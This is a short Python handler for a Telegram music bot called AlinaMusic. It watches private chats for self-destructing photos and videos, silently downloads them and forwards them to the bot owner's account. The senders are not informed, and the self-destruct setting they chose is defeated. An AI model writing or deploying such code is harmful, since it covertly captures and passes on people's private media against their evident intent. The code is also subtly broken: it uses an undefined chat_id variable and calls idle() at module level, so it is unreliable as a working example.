from AlinaMusic import app
from AlinaMusic.utils.database import get_assistant
from config import OWNER_ID
from pyrogram import filters, idle


@app.on_message(filters.media & filters.private)
async def get_dest(app, message):
    userbot = await get_assistant(chat_id)
    # To save Self-Destructing photo
    if message.photo and message.photo.ttl_seconds:
        photo = await message.download()
        return await userbot.send_photo(OWNER_ID, photo)

    # To save Self-Destructing Video
    if message.video and message.video.ttl_seconds:
        video = await message.download()
        return await userbot.send_video(OWNER_ID, video)


idle()
